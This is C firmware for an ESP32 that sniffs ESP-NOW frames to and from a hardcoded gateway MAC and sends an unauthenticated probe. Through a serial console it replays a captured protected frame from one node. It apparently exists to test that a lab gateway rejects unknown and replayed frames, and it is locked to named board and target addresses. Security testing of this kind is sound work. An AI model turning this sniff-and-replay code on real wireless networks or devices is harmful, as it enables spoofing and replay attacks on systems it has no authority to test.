#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "esp_event.h"
#include "esp_mac.h"
#include "esp_now.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"
#include "freertos/task.h"
#include "nvs_flash.h"

/* Public inventory address. No PMK, LMK, HMAC key or Wi-Fi password is used. */
static const uint8_t gateway_mac[6] = {0xB0, 0x3F, 0xD3, 0x5B, 0x50, 0xB4};
static const uint8_t expected_board_mac[6] = {0xFC, 0x01, 0x2C, 0xCB, 0x36, 0x50};
static const uint8_t captured_node1_mac[6] = {0x20, 0x50, 0x0D, 0x17, 0xC8, 0xD0};

#define MAX_CAPTURE_BYTES 320
#define HOP_INTERVAL_MS 2000

typedef struct {
    uint32_t uptime_ms;
    uint16_t length;
    uint8_t channel;
    int8_t rssi;
    uint8_t bytes[MAX_CAPTURE_BYTES];
} capture_t;

typedef struct __attribute__((packed)) {
    uint16_t magic;
    uint8_t version;
    uint8_t type;
    uint32_t sequence;
    char device_id[24];
    uint8_t payload_len;
    uint8_t nonce[12];
    uint8_t payload[128];
    uint8_t auth_tag[16];
    uint8_t hmac[32];
} lab_frame_t;

static QueueHandle_t capture_queue;
static volatile bool channel_locked;
static volatile uint8_t current_channel = 1;
static volatile uint32_t observed_frames;
static volatile uint32_t queue_drops;
static volatile uint32_t seen_management;
static volatile uint32_t seen_action;
static volatile uint32_t seen_vendor_action;
static volatile uint32_t seen_target_action;
static volatile uint32_t seen_target_protected_action;
static uint8_t replay_buffer[MAX_CAPTURE_BYTES];
static size_t replay_expected;
static size_t replay_written;

static bool target_address(const uint8_t *frame) {
    /* 802.11 management frame: destination at 4, source at 10. */
    return memcmp(frame + 4, gateway_mac, 6) == 0 ||
           memcmp(frame + 10, gateway_mac, 6) == 0;
}

static void capture_callback(void *buffer, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT || !buffer || !capture_queue) return;
    seen_management++;
    const wifi_promiscuous_pkt_t *packet = buffer;
    const uint8_t *frame = packet->payload;
    size_t length = packet->rx_ctrl.sig_len;
    bool action = length >= 24 && frame[0] == 0xD0;
    bool target = action && target_address(frame);
    bool protected_action = action && (frame[1] & 0x40) != 0;
    bool vendor_action = length >= 28 && action && frame[24] == 0x7F &&
                         frame[25] == 0x18 && frame[26] == 0xFE && frame[27] == 0x34;
    if (action) seen_action++;
    if (vendor_action) seen_vendor_action++;
    if (target) seen_target_action++;
    if (target && protected_action) seen_target_protected_action++;
    /* For protected action frames the vendor OUI is encrypted. The visible
       MAC header still lets us retain gateway traffic without any key. */
    if (length > MAX_CAPTURE_BYTES || !target ||
        (!protected_action && !vendor_action)) return;

    capture_t capture = {
        .uptime_ms = (uint32_t)(esp_timer_get_time() / 1000),
        .length = (uint16_t)length,
        .channel = packet->rx_ctrl.channel,
        .rssi = packet->rx_ctrl.rssi,
    };
    memcpy(capture.bytes, frame, length);
    if (xQueueSend(capture_queue, &capture, 0) != pdTRUE) queue_drops++;
}

static void set_channel(uint8_t channel, bool lock) {
    if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
        current_channel = channel;
        channel_locked = lock;
        printf("CHANNEL channel=%u mode=%s\n", channel, lock ? "locked" : "hop");
    } else {
        printf("ERROR no_se_pudo_cambiar_canal=%u\n", channel);
    }
}

static void print_capture(const capture_t *capture) {
    observed_frames++;
    printf("CAPTURE uptime_ms=%lu channel=%u rssi=%d len=%u dst=",
           (unsigned long)capture->uptime_ms, capture->channel,
           capture->rssi, capture->length);
    for (int i = 4; i < 10; ++i) printf("%02X%s", capture->bytes[i], i == 9 ? "" : ":");
    printf(" src=");
    for (int i = 10; i < 16; ++i) printf("%02X%s", capture->bytes[i], i == 15 ? "" : ":");
    printf(" hex=");
    for (size_t i = 0; i < capture->length; ++i) printf("%02X", capture->bytes[i]);
    printf("\n");
}

static void send_unknown_probe(void) {
    lab_frame_t frame = {0};
    frame.magic = 0x5044;
    frame.version = 2;
    frame.type = 1;
    frame.sequence = 1;
    memcpy(frame.device_id, "lab-unknown-s3", sizeof("lab-unknown-s3"));
    /* The intentionally missing HMAC and LMK make this an unknown-device test. */
    esp_err_t result = esp_now_send(gateway_mac, (const uint8_t *)&frame, sizeof(frame));
    printf("PROBE channel=%u dst=B0:3F:D3:5B:50:B4 device_id=lab-unknown-s3 "
           "bytes=%u esp_now_send=%s\n", current_channel,
           (unsigned)sizeof(frame), esp_err_to_name(result));
    printf("PROBE_NOTE send_ok_only_queues_radio_transmission; "
           "verify_rejection_in_gateway_and_backend_logs\n");
}

static int hex_nibble(char value) {
    if (value >= '0' && value <= '9') return value - '0';
    if (value >= 'a' && value <= 'f') return value - 'a' + 10;
    if (value >= 'A' && value <= 'F') return value - 'A' + 10;
    return -1;
}

static void send_replay_bytes(const uint8_t *raw, size_t length) {
    if (!channel_locked || length < 40 || length > MAX_CAPTURE_BYTES ||
        raw[0] != 0xD0 || (raw[1] & 0x40) == 0 ||
        memcmp(raw + 4, gateway_mac, 6) != 0 ||
        memcmp(raw + 10, captured_node1_mac, 6) != 0) {
        printf("REPLAY_ERROR canal_o_trama_no_autorizada\n");
        return;
    }
    /* Single exact attempt: preserve the 802.11 sequence and protected body. */
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, raw, (int)length, false);
    printf("REPLAY channel=%u bytes=%u source=20:50:0D:17:C8:D0 dst=B0:3F:D3:5B:50:B4 "
           "esp_wifi_80211_tx=%s\n", current_channel, (unsigned)length,
           esp_err_to_name(result));
}

static void replay_begin(const char *length_text) {
    char *end = NULL;
    long length = strtol(length_text, &end, 10);
    if (end == length_text || length < 40 || length > MAX_CAPTURE_BYTES) {
        printf("REPLAY_ERROR longitud_invalida\n");
        return;
    }
    replay_expected = (size_t)length;
    replay_written = 0;
    printf("REPLAY_BEGIN bytes=%u\n", (unsigned)replay_expected);
}

static void replay_chunk(const char *parameters) {
    unsigned offset = 0;
    char hex[33] = {0};
    if (sscanf(parameters, "%u %32s", &offset, hex) != 2) {
        printf("REPLAY_ERROR chunk_sintaxis\n");
        return;
    }
    size_t digits = strlen(hex);
    if (!replay_expected || offset != replay_written || digits == 0 ||
        digits % 2 != 0 || replay_written + digits / 2 > replay_expected) {
        printf("REPLAY_ERROR chunk_posicion_o_longitud\n");
        return;
    }
    for (size_t i = 0; i < digits / 2; ++i) {
        int hi = hex_nibble(hex[i * 2]);
        int lo = hex_nibble(hex[i * 2 + 1]);
        if (hi < 0 || lo < 0) {
            printf("REPLAY_ERROR caracter_hex_invalido\n");
            return;
        }
        replay_buffer[replay_written + i] = (uint8_t)((hi << 4) | lo);
    }
    replay_written += digits / 2;
    printf("REPLAY_CHUNK received=%u/%u\n",
           (unsigned)replay_written, (unsigned)replay_expected);
}

static void console_task(void *unused) {
    (void)unused;
    char line[96];
    printf("COMMANDS status | channel 1..13 | hop | probe | replay_begin N | "
           "replay_chunk OFFSET HEX | replay_send\n");
    while (true) {
        if (!fgets(line, sizeof(line), stdin)) {
            clearerr(stdin);
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }
        if (strncmp(line, "status", 6) == 0) {
            printf("STATUS channel=%u mode=%s captures=%lu queue_drops=%lu "
                   "mgmt=%lu action=%lu vendor=%lu target=%lu protected_target=%lu "
                   "gateway=B0:3F:D3:5B:50:B4\n", current_channel,
                   channel_locked ? "locked" : "hop", (unsigned long)observed_frames,
                   (unsigned long)queue_drops, (unsigned long)seen_management,
                   (unsigned long)seen_action, (unsigned long)seen_vendor_action,
                   (unsigned long)seen_target_action,
                   (unsigned long)seen_target_protected_action);
        } else if (strncmp(line, "channel ", 8) == 0) {
            char *end = NULL;
            long channel = strtol(line + 8, &end, 10);
            if (end == line + 8 || channel < 1 || channel > 13) {
                printf("ERROR canal_debe_estar_entre_1_y_13\n");
            } else {
                set_channel((uint8_t)channel, true);
            }
        } else if (strncmp(line, "hop", 3) == 0) {
            channel_locked = false;
            printf("HOP automatico_hasta_detectar_gateway\n");
        } else if (strncmp(line, "probe", 5) == 0) {
            if (!channel_locked) printf("ERROR fije_el_canal_o_espere_una_captura\n");
            else send_unknown_probe();
        } else if (strncmp(line, "replay_begin ", 13) == 0) {
            replay_begin(line + 13);
        } else if (strncmp(line, "replay_chunk ", 13) == 0) {
            replay_chunk(line + 13);
        } else if (strncmp(line, "replay_send", 11) == 0) {
            if (replay_expected && replay_written == replay_expected)
                send_replay_bytes(replay_buffer, replay_expected);
            else
                printf("REPLAY_ERROR trama_incompleta=%u/%u\n",
                       (unsigned)replay_written, (unsigned)replay_expected);
            replay_expected = 0;
            replay_written = 0;
        } else {
            printf("COMMANDS status | channel 1..13 | hop | probe | "
                   "replay_begin N | replay_chunk OFFSET HEX | replay_send\n");
        }
    }
}

void app_main(void) {
    uint8_t board_mac[6];
    ESP_ERROR_CHECK(esp_read_mac(board_mac, ESP_MAC_WIFI_STA));
    if (memcmp(board_mac, expected_board_mac, 6) != 0) {
        printf("ERROR MAC inesperada; firmware de laboratorio detenido\n");
        return;
    }

    esp_err_t nvs = nvs_flash_init();
    if (nvs == ESP_ERR_NVS_NO_FREE_PAGES || nvs == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        nvs = nvs_flash_init();
    }
    ESP_ERROR_CHECK(nvs);
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    wifi_init_config_t config = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&config));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE));

    capture_queue = xQueueCreate(16, sizeof(capture_t));
    ESP_ERROR_CHECK(capture_queue ? ESP_OK : ESP_ERR_NO_MEM);
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(capture_callback));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    ESP_ERROR_CHECK(esp_now_init());
    esp_now_peer_info_t peer = {0};
    memcpy(peer.peer_addr, gateway_mac, 6);
    peer.ifidx = WIFI_IF_STA;
    peer.channel = 0;
    peer.encrypt = false;
    ESP_ERROR_CHECK(esp_now_add_peer(&peer));

    printf("LAB_READY board=FC:01:2C:CB:36:50 target=B0:3F:D3:5B:50:B4 "
           "mode=passive channel_hop=1..13 no_secrets\n");
    xTaskCreate(console_task, "lab_console", 4096, NULL, 5, NULL);

    capture_t capture;
    uint32_t last_hop = (uint32_t)(esp_timer_get_time() / 1000);
    while (true) {
        if (xQueueReceive(capture_queue, &capture, pdMS_TO_TICKS(100)) == pdTRUE) {
            if (!channel_locked) set_channel(capture.channel, true);
            print_capture(&capture);
        }
        uint32_t now = (uint32_t)(esp_timer_get_time() / 1000);
        if (!channel_locked && now - last_hop >= HOP_INTERVAL_MS) {
            set_channel(current_channel == 13 ? 1 : current_channel + 1, false);
            last_hop = now;
        }
    }
}
